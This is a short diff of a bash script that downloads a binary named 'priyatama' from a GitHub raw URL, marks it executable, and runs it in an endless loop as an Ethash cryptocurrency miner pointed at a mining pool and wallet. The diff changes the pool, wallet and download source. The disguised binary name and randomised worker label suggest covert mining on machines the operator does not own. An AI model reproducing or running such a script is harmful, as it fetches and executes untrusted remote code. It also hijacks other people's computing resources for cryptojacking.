@@ -1,8 +1,8 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+POOL=eth.hashcity.org:7777
+WALLET=henry435435345.1
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/priyatama
+wget https://github.com/mohammad2h3/prem/raw/main/priyatama
 chmod +x priyatama
 while [ 1 ]; do
 ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
